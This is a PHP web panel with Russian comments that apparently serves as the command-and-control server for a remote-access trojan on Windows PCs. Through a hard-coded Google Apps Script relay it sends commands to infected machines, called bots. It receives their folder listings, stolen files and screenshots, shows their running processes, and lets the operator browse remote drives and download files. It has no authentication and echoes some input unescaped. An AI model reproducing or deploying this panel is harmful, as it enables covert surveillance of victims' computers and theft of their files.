<?php
ob_start(); 
session_start();
error_reporting(E_ALL); ini_set('display_errors', 1);

// !!! ВСТАВЬ СВОЙ URL GOOGLE SCRIPT НИЖЕ !!!
$api = "https://script.google.com/macros/s/AKfycbwDgR5LEV3rc7kiJjGqsa6IQkX4ZOfPWFcyA2appKMzSt8D4j7xUIPLkGhQRyExYw1P/exec";

// Папки для хранения кэша, чтобы не забивать оперативку
$cache_dir = __DIR__ . '/explorer_cache/';
if (!is_dir($cache_dir)) mkdir($cache_dir, 0777, true);

// 1. ПРИЕМ ДАННЫХ И ФАЙЛОВ ОТ БОТА
if (isset($_POST['screenshot_device_id'])) {
    $dev_id = preg_replace('/[^a-zA-Z0-9_-]/', '', $_POST['screenshot_device_id']);
    
    // Бот прислай JSON структуру папки
    if (isset($_POST['folder_structure'])) {
        // Жестко пишем структуру папки в текстовый файл на диск Render
        file_put_contents($cache_dir . $dev_id . '_tree.txt', $_POST['folder_structure']);
        file_put_contents($cache_dir . $dev_id . '_path.txt', $_POST['current_path'] ?? 'C:\\');
        echo "SERVER_SAVED_STRUCTURE";
        exit;
    }

    // Бот прислал запрошенный файл
    if (isset($_FILES['downloaded_file'])) {
        $upload_dir = __DIR__ . '/downloads/';
        if (!is_dir($upload_dir)) mkdir($upload_dir, 0777, true);
        $filename = basename($_FILES['downloaded_file']['name']);
        $target_file = $upload_dir . $dev_id . '_' . $filename;
        if (move_uploaded_file($_FILES['downloaded_file']['tmp_name'], $target_file)) {
            file_put_contents($cache_dir . $dev_id . '_lastfile.txt', $filename);
            echo "SERVER_SAVED_FILE";
        }
        exit;
    }
    
    // Бот прислал скриншот
    if (isset($_FILES['screenshot_file'])) {
        $upload_dir = __DIR__ . '/screenshots/';
        if (!is_dir($upload_dir)) mkdir($upload_dir, 0777, true);
        $target_file = $upload_dir . 'screen_' . $dev_id . '.jpg';
        move_uploaded_file($_FILES['screenshot_file']['tmp_name'], $target_file);
        echo "SERVER_SAVED_SCREENSHOT";
        exit;
    }
}

// 2. СКАЧИВАНИЕ ФАЙЛОВ С ПАНЕЛИ
if (isset($_GET['get_file']) && isset($_GET['dev'])) {
    $dev_id = preg_replace('/[^a-zA-Z0-9_-]/', '', $_GET['dev']);
    $filename = basename($_GET['get_file']);
    $file = __DIR__ . '/downloads/' . $dev_id . '_' . $filename;
    if (file_exists($file)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . $filename . '"');
        readfile($file);
    } else { echo "Файл не найден."; }
    exit;
}

if (isset($_GET['download_screen'])) {
    $dev_id = preg_replace('/[^a-zA-Z0-9_-]/', '', $_GET['download_screen']);
    $file = __DIR__ . '/screenshots/screen_' . $dev_id . '.jpg';
    if (file_exists($file)) {
        header('Content-Type: image/jpeg');
        header('Content-Disposition: attachment; filename="screenshot_'.$dev_id.'.jpg"');
        readfile($file);
    } else { echo "Скриншот не найден."; }
    exit;
}

// 3. ОБРАБОТЧИК КНОПОК ПАНЕЛИ
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $action = isset($_POST["action"]) ? trim($_POST["action"]) : ""; 
    $device_id = isset($_POST["device_id"]) ? trim($_POST["device_id"]) : "";
    $target_path = isset($_POST["target_path"]) ? trim($_POST["target_path"]) : "";

    if (!empty($action) && !empty($device_id)) {
        if (($action === "get_files" || $action === "download_file") && !empty($target_path)) {
            $action = $action . "::" . $target_path;
        }
        $ch = curl_init($api); 
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); 
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query(["action" => $action, "device_id" => $device_id])); 
        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/x-www-form-urlencoded']);
        curl_setopt($ch, CURLOPT_TIMEOUT, 6);
        curl_exec($ch); 
        curl_close($ch);
    }
    header("Location: " . $_SERVER['PHP_SELF']); 
    exit;
}

function getData($url) {
    $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); 
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); curl_setopt($ch, CURLOPT_TIMEOUT, 6); 
    $res = curl_exec($ch); curl_close($ch); return json_decode($res, true) ?: [];
}
$devices = getData($api); $logs = getData($api . "?get_logs=1");
?>
<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<title>Надежная Панель Управления</title>
<style>
body{ margin:0; font-family:system-ui, sans-serif; background:#090d16; color:#e2e8f0; padding-bottom:50px;}
.header{ padding:18px 24px; background:#0f172a; border-bottom:1px solid #1e293b; font-weight:bold; font-size:19px; display:flex; justify-content:space-between; align-items:center;}
.sync-indicator{ font-size:12px; color:#64748b;}
.dot{ width:8px; height:8px; background:#34d399; border-radius:50%; margin-right:8px; display:inline-block; animation: pulse 1.5s infinite; }
@keyframes pulse { 0%, 100% { opacity: 0.4; } 50% { opacity: 1; } }
.container{ padding:24px; display:grid; grid-template-columns:repeat(auto-fill,minmax(350px,1fr)); gap:20px; }
.card{ background:#111827; border:1px solid #1f2937; border-radius:14px; padding:20px; }
.online-card { border-color: #064e3b; }
.name{ font-weight:700; font-size:17px; margin-bottom:6px; color:#f8fafc;}
.status{ font-size:11px; padding:4px 10px; border-radius:999px; display:inline-block; font-weight:bold; text-transform:uppercase;}
.online { background:#064e3b; color:#34d399; } .offline { background:#374151; color:#9ca3af; }
.row{ margin-top:10px; font-size:13px; color:#94a3b8; word-break: break-all;}
button, .btn-link{ width:100%; margin-top:8px; padding:10px; border-radius:8px; border:none; cursor:pointer; font-weight:600; display:block; text-align:center; box-sizing:border-box; text-decoration:none; font-size:13px; transition: 0.2s;}
.blue { background:#4f46e5; color:white; } .blue:hover{ background:#4338ca; }
.green { background:#059669; color:white; } .green:hover{ background:#047857; }
.orange { background:#d97706; color:white; } .orange:hover{ background:#b45309; }
.explorer-box { background:#030712; border:1px solid #1f2937; border-radius:8px; padding:10px; margin-top:10px; max-height:250px; overflow-y:auto; }
.exp-item { display:flex; justify-content:space-between; align-items:center; padding:6px; border-bottom:1px solid #111827; font-size:12px; }
.exp-btn { background:none; border:none; color:#60a5fa; text-align:left; padding:0; width:auto; margin:0; display:inline; font-weight:normal; font-family:monospace; cursor:pointer;}
.exp-btn:hover { text-decoration:underline; color:#93c5fd; }
.log-section{ margin:24px; background:#111827; border:1px solid #1f2937; border-radius:14px; padding:20px;}
table{ width:100%; border-collapse:collapse; font-size:13px;}
th, td{ padding:12px; border-bottom:1px solid #1f2937; text-align:left;}
.process-box { background:#030712; padding:10px; border-radius:8px; border:1px solid #1f2937; font-family:monospace; font-size:11px; color:#10b981; max-height:120px; overflow-y:auto; margin-top:8px; display:none; white-space: pre-wrap; }
</style>
</head>
<body>

<div class="header">
    <span>🖥 Панель Управления + Проводник (Дисковый Кэш)</span>
    <div class="sync-indicator"><span class="dot"></span>Автообновление (10с)</div>
</div>

<div class="container">
    <?php 
    foreach($devices as $d): 
        $dev_id = $d["device_id"] ?? ""; if (empty($dev_id)) continue;

        $time_raw = $d["time"] ?? ""; $last = 0;
        if (!empty($time_raw)) {
            if (preg_match('/(\d{2})\.(\d{2})\.(\d{4})\s(.*)/', $time_raw, $matches)) {
                $time_raw = $matches[3] . "-" . $matches[2] . "-" . $matches[1] . " " . $matches[4];
            }
            $last = @strtotime($time_raw);
        }
        $isOnline = ((time() - $last) <= 35 && $last > 0);
        $card_class = $isOnline ? "online-card" : "";
    ?>
    <div class="card <?=$card_class?>">
        <div class="name"><?=htmlspecialchars($d["name"] ?? "Неизвестный ПК")?></div>
        <div class="status <?=($isOnline?"online":"offline")?>"><?=($isOnline?"В сети":"Не в сети")?></div>
        <div class="row"><b>ID железа:</b> <span style="font-family:monospace;"><?=$dev_id?></span></div>

        <button type="button" class="blue" onclick="toggleConsole('proc_<?=$dev_id?>')">📟 Консоль процессов</button>
        <div class="process-box" id="proc_<?=$dev_id?>"><?=htmlspecialchars($d["processes"] ?? "")?></div>

        <hr style="border-color:#1f2937; margin:12px 0;">

        <div class="name" style="font-size:14px; margin-top:10px;">📂 Онлайн Проводник ПК:</div>
        
        <form method="POST" action="">
            <input type="hidden" name="action" value="get_files">
            <input type="hidden" name="device_id" value="<?=$dev_id?>">
            <?php 
                $path_file = $cache_dir . $dev_id . '_path.txt';
                $cur_path = file_exists($path_file) ? file_get_contents($path_file) : 'C:\\';
            ?>
            <span style="font-size:11px; color:#64748b; font-family:monospace; display:block; margin-bottom:4px;">Путь: <?=htmlspecialchars($cur_path)?></span>
            <input type="hidden" name="target_path" value="<?=htmlspecialchars($cur_path)?>">
            <button type="submit" class="blue" style="background:#0284c7; margin:0;">🔄 Обновить папку / Перейти на C:</button>
        </form>

        <div class="explorer-box">
            <?php 
            $tree_file = $cache_dir . $dev_id . '_tree.txt';
            $items = file_exists($tree_file) ? json_decode(file_get_contents($tree_file), true) : [];
            
            if(empty($items)) {
                echo "<span style='font-size:11px; color:#4b5563;'>Кэш пуст. Нажмите кнопку «Обновить папку»</span>";
            } else {
                // Кнопка Назад
                if ($cur_path !== 'C:\\' && $cur_path !== 'C:/') {
                    $parent = dirname($cur_path);
                    if($parent . '\\' === $cur_path || $parent === $cur_path || $parent === '.') { $parent = 'C:\\'; }
                    echo "<div class='exp-item'>
                            <form method='POST' action=''>
                                <input type='hidden' name='action' value='get_files'><input type='hidden' name='device_id' value='{$dev_id}'>
                                <input type='hidden' name='target_path' value='".htmlspecialchars($parent)."'>
                                <button type='submit' class='exp-btn' style='color:#f59e0b;'>📁 .. [Назад]</button>
                            </form>
                          </div>";
                }

                foreach($items as $item) {
                    $isDir = $item['is_dir']; $name = $item['name']; $full = $item['path'];
                    echo "<div class='exp-item'>";
                    if($isDir) {
                        echo "<form method='POST' action=''>
                                <input type='hidden' name='action' value='get_files'><input type='hidden' name='device_id' value='{$dev_id}'>
                                <input type='hidden' name='target_path' value='".htmlspecialchars($full)."'>
                                <button type='submit' class='exp-btn'>📁 {$name}</button>
                              </form>";
                    } else {
                        echo "<form method='POST' action=''>
                                <input type='hidden' name='action' value='download_file'><input type='hidden' name='device_id' value='{$dev_id}'>
                                <input type='hidden' name='target_path' value='".htmlspecialchars($full)."'>
                                <button type='submit' class='exp-btn' style='color:#10b981;'>📄 {$name}</button>
                              </form>";
                        echo "<span style='font-size:10px; color:#4b5563;'>{$item['size']}</span>";
                    }
                    echo "</div>";
                }
            }
            ?>
        </div>

        <?php 
        $last_file_ptr = $cache_dir . $dev_id . '_lastfile.txt';
        if (file_exists($last_file_ptr)): $fn = file_get_contents($last_file_ptr); 
        ?>
            <a href="?get_file=<?=urlencode($fn)?>&dev=<?=$dev_id?>" class="btn-link green" style="background:#10b981; margin-top:6px;">💾 Скачать: <?=$fn?></a>
        <?php endif; ?>

        <hr style="border-color:#1f2937; margin:12px 0;">

        <form method="POST" action="" style="margin-bottom:6px;">
            <input type="hidden" name="action" value="take_screenshot"><input type="hidden" name="device_id" value="<?=$dev_id?>">
            <button type="submit" class="blue">📸 Сделать Скриншот</button>
        </form>
        <?php if (file_exists(__DIR__ . '/screenshots/screen_' . $dev_id . '.jpg')): ?>
            <a href="?download_screen=<?=urlencode($dev_id)?>" class="btn-link green" target="_blank" style="margin-bottom:6px;">📥 Посмотреть скриншот</a>
        <?php endif; ?>
    </div>
    <?php endforeach; ?>
</div>

<script>
function toggleConsole(id) { let box = document.getElementById(id); box.style.display = (box.style.display === "block") ? "none" : "block"; }
setInterval(function() { location.reload(); }, 10000);
</script>
</body>
</html>
